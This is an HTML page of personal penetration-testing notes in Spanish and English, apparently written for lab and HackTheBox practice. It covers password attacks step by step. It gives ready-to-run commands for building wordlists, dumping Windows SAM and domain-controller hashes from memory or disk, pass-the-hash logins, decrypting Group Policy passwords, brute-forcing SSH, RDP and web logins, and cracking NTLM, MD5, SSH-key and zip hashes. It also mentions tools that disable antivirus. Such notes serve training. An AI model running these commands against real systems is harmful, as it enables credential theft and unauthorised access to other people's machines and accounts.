<h1 id="1-preparing-for-brute-force"><strong>1 Preparing for brute force</strong></h1>
<hr />

<h2 id="identify-hash">Identify hash</h2>
<p>hash-identifier</p>

<h2 id="crunch">crunch</h2>
<h4 id="-crear-passwords-de-6-digitos-con-valores-hasta-f-112mb">| crear passwords de 6 digitos con valores hasta f (112MB)</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 root@kali: crunch 6 6 0123456789ABCDEF -o list.txt
</code></pre></div></div>
<h4 id="-crear-algo-mas-comun-con-character-sets-34-mb">| crear algo mas comun CON CHARACTER SETS (34 MB)</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha -o mixedalpha.txt

</code></pre></div></div>

<h2 id="cewl">cewl</h2>
<h4 id="-podemos-usar-palabras-y-frases-de-la-pagina-web-de-la-empresa-para-generar-una-lista">| podemos usar palabras y frases de la pagina web de la empresa para generar una lista.</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    root@kali: cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
</code></pre></div></div>

<h4 id="-create-custom-dic">| create custom dic</h4>
<ul>
  <li>usamos john para modificar las palabras que bajamos.
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root@kali: vim /etc/john/john.conf
 root@kali: john --wordlist=megacorp-cewl.txt --rules --stdout&gt;mutated.txt
</code></pre></div>    </div>
  </li>
</ul>

<h1 id="2-windows-dump"><strong>2 WINDOWS DUMP</strong></h1>
<hr />

<h2 id="sam">SAM</h2>
<p>The Security Account Manager (SAM) is a database file[1] in Windows XP, Windows Vista, Windows 7, 8.1 and 10 that stores users’ passwords.</p>

<p>location:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/windows/system32/config/SAM
</code></pre></div></div>
<p>The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash</p>

<h2 id="lm-ntlm-net-ntlmv2-hashes">LM NTLM NET-NTLMv2 hashes</h2>

<h3 id="ntlm"><strong>NTLM:</strong></h3>
<p>NTLM hashes are stored in the Security Account Manager (SAM) database and in the Domain Controller’s NTDS.dit database.</p>
<ul>
  <li>from 1
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
 lmhas                           :  ntlmhash
</code></pre></div>    </div>
  </li>
  <li>form 2
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:214e90b41e2752d80acd34e13f3e9831:::
username     :userid:        lmhash               :         ntlmhash  :::
</code></pre></div>    </div>
    <p>The LM hash is the one before the semicolon (:) and the NT hash is the one after the semicolon. Starting with Windows Vista and Windows Server 2008, by default, only the NT hash is stored.</p>
  </li>
</ul>

<h3 id="-net-ntlmv1v2">** Net-NTLMv1/v2**</h3>
<p>Net-NTLM hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user’s NT hash). Here is an example of a Net-NTLMv2 (a.k.a NTLMv2) hash:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
</code></pre></div></div>

<h2 id="volatility">volatility</h2>
<p>Retrieve a user’s password from a memory dump you need to know the OS</p>
<h4 id="-1-check-profile-type-of-the-memory-dump-ex-win7sp1x86">| 1. check profile type of the memory dump (ex: Win7SP1x86):</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>volatility imageinfo -f memorydumpfilename.raw
</code></pre></div></div>
<h4 id="-2-get-the-hive-list-so-we-can-get-the-starting-location-in-memory-of-where-the-registry-information-resides">| 2. get the hive list so we can get the starting location in memory of where the registry information resides:</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>volatility hivelist -f memdumpfilename.raw --profile=Win7SP1x86
0x9aad6148 0x131af148 \SystemRoot\System32\Config\SAM
0x8b21c008 0x039ef008 \REGISTRY\MACHINE\SYSTEM
</code></pre></div></div>
<blockquote>
  <p>0x9aad6148, 0x8b21c008</p>
</blockquote>

<h4 id="-3-dump-the-hashes">| 3. dump the hashes</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>volatility -f memorydumpfilename.dmp --profile=Win7SP1x86 hashdump -y 0x8b21c008 -s 0x9aad6148 &gt; hashes.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
</code></pre></div></div>

<h4 id="-4-pass-the-hash">| 4. pass the hash</h4>
<p>with pth-winexe:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali: pth-winexe -U administrator%hash //192.168.31.233 cmd
</code></pre></div></div>
<p>with psexec.py:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 htb/administrator@10.10.10.161 cmd.exe
</code></pre></div></div>

<h2 id="pwdump-and-fgdump">pwdump and fgdump</h2>

<ul>
  <li>PWdump.exe can be used to crack local SAM hashes in memory. Does not have the added bonus like FGdump of disabling antivirus. This will need to be done prior to running the program
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwdump.exe (host)
</code></pre></div>    </div>
  </li>
  <li>fgdump.exe can be used to crack local SAM hashes in memory. The program uses the IPC$ share to connect and additionally attempts to disable antivirus that may be running on the host
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fgdump.exe, then "type 127.0.0.1.pwdump"
</code></pre></div>    </div>
    <h2 id="pwdump-sam-drump-hashes">pwdump sam drump hashes</h2>

    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/vhd/Windows/System32/config: pwdump SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::

</code></pre></div>    </div>
  </li>
</ul>

<h2 id="wce-windows-credential-editor">WCE windows credential editor</h2>
<p>wce32.exe (wce64.exe) can be used to attempt cracking of user passwords in memory, windows xp, vista, 2003, 7 y 2008
wce can be use to pass the hash.
You need local administrator privileges to run WCE and be able to steal NTLM credentials from memory. This is a post-exploitation tool.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   c:\user&gt; wce64.exe -w
   c:\user&gt; wce32.exe -w
</code></pre></div></div>

<h2 id="passing-the-hash">passing the hash</h2>

<p>nltm hash se puede usar en lugar deun clear text</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  root@kali: vim hashes.txt
</code></pre></div></div>
<p>remplazamos el no password por otra cosa y despues exportamos ese hash</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  root@kali: export SMBHASH=saras...asdas
  root@kali: pth-winexe -U administrator%hash //192.168.31.233 cmd
  psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 htb/administrator@10.10.10.161 cmd.exe

ex:
  pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd
</code></pre></div></div>

<p>You <strong>CAN</strong> perform Pass-The-Hash attacks with NTLM hashes.
You <strong>CANNOT</strong> perform Pass-The-Hash attacks with Net-NTLM hashes.
You <strong>CAN</strong> attack net-ntlmv2 with responder with LLMNR Poisonin</p>

<h1 id="3-active-directory"><strong>3 Active Directory</strong></h1>
<hr />
<h2 id="misconfigured-ad">Misconfigured AD</h2>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use z: \\(target_hostname)\SYSVOL
dir /s Groups.xml
type Z:\local.domain\Policies\{84583021-C460-486C-83E1- FA1EC8CA84FC}\Machine\Preferences\Groups\Groups.xml
gpp-decrypt SvtusBQWJgAFrFPTyPH9clizXPQBDqDDGzlSDxKogcz, password will be outputted
</code></pre></div></div>

<h2 id="ad-password-audit">AD password audit</h2>
<p>The psexec_ntdsgrab module will be used to create Volume Shadow Copies of the ntds.dit and SYSTEM hive and grab them from the domain controller. It requires domain administrator credentials.</p>

<p>crea 2 archivos uno .dit y otro .bin</p>

<p>extract hashes</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ./impacket/examples/secretsdump.py -ntds /home/lab/.msf4/loot/[blah]_psexec.ntdsgrab._104930.dit -system /home/lab/.msf4/loot/[blah]_psexec.ntdsgrab._438132.bin -hashes lmhash:nthash LOCAL -outputfile ntlm_hashes
</code></pre></div></div>

<h1 id="4-online-passwords-attack"><strong>4 Online passwords attack</strong></h1>
<hr />
<p>para tratar de conectarse a http ssh ftp, etc, hay que mandar varios request al server\</p>

<p><strong>tools</strong>:medusa hydra ncrack</p>

<h2 id="medusa">medusa</h2>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali: medusa -h 192.168.31.219 -u admin -P password-file.txt -M http -m DIR:/admin -T 20
</code></pre></div></div>

<h2 id="crowbar-rdesktop">crowbar (rdesktop)</h2>
<p>for example for rdesktop</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
</code></pre></div></div>

<h2 id="hydra">hydra</h2>
<ul>
  <li>ej:
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra –l (found_name) –P password.lst 192.168.168.168 ssh
hydra -L username_list.txt -P password_list.txt 192.168.168.168 ssh -t 4
-l user
-L list of user
-p password
-P list of passwords
</code></pre></div>    </div>
  </li>
  <li><strong>HTTP post form</strong>
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L &lt;wordlist&gt; -P&lt;password list&gt; &lt;IP&gt; http-post-form "&lt;file path&gt;:username=^USER^&amp;password=^PASS^&amp;Login=Login:&lt;fail message&gt;"
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="ncrack">ncrack</h2>

<p>sirve mucho para romper rdp</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   root@kali: ncrack -v -f --user administrator -P password-file.txt rdp://192.168.31.233,CL=1
</code></pre></div></div>

<h1 id="5-offline-passwords-attack"><strong>5 Offline passwords attack</strong></h1>
<hr />

<h2 id="john-the-ripper">John the ripper</h2>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# john  hashes.txt

root@kali:~# john --format=nt windowshashes.txt --wordlist=passwords.txt
root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 password_list

</code></pre></div></div>

<h2 id="ssh-keys-bruteforce">ssh keys bruteforce</h2>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2496  python /usr/share/john/ssh2john.py  matt_rsa  &gt; matt.hash
2500  john --wordlist=rockyou.txt  ~/.ssh/matt.hash
</code></pre></div></div>

<h2 id="unshadow">unshadow</h2>
<ul>
  <li>ex:
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> unshadow password_file shadow_file &gt; new_password_list
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="oclhashcat-ntlm-sam-hash-from-pwdump">oclhashcat ntlm sam hash from pwdump</h2>
<ul>
  <li>suponiendo:</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat hash-nolimpio.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:214e90b41e2752d80acd34e13f3e9831:::
username :  userid : lmhash : ntlmhash
cat hashes.txt
&gt; 214e90b41e2752d80acd34e13f3e9831
</code></pre></div></div>

<ul>
  <li>corremos:
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# hashcat -m 1000 -a 0  --force hashes-bastion/hashes.txt  rockyou.txt  
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="md5-hashcat">md5 hashcat</h2>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I put this $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ into a .txt file and the following command: hashcat -m 500 -a 0 --force davidHash '/root/Desktop/rockyou.txt'
</code></pre></div></div>

<h2 id="online-hash-crackers">online hash crackers</h2>
<ul>
  <li>Hashkiller (Windows/NTLM):
    https://hashkiller.co.uk/ntlm-decrypter.aspx</li>
  <li>Crackstation (MD5):
    https://crackstation.net</li>
  <li>Offensive security (MD5):
    http://cracker.offensive-security.com</li>
</ul>

<h2 id="cracking-ntlm-hashes-sam-dump">cracking ntlm hashes SAM dump</h2>
<h4 id="-lm">| lm</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>299BD128C1101FD6
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --format=lm hash.txt
hashcat -m 3000 -a 3 hash.txt
</code></pre></div></div>

<h4 id="-nthash">| NTHash</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>B4B9B02E6F09A9BD760F388B67351E2B
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --format=nt hash.txt
hashcat -m 1000 -a 3 hash.txt
</code></pre></div></div>

<h4 id="-ntlmv1-aka-net-ntlmv1">| NTLMv1 (A.K.A. Net-NTLMv1)</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --format=netntlm hash.txt
hashcat -m 5500 -a 3 hash.txt
</code></pre></div></div>

<h4 id="-ntlmv2-aka-net-ntlmv2">| NTLMv2 (A.K.A. Net-NTLMv2)</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt
</code></pre></div></div>

<h1 id="6-zip"><strong>6 ZIP</strong></h1>
<hr />
<h2 id="fcrackzip">fcrackzip</h2>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> fcrackzip -v -u -D -p "rockyou.txt" /root/hackthebox/node/myplace-backup.zip
</code></pre></div></div>
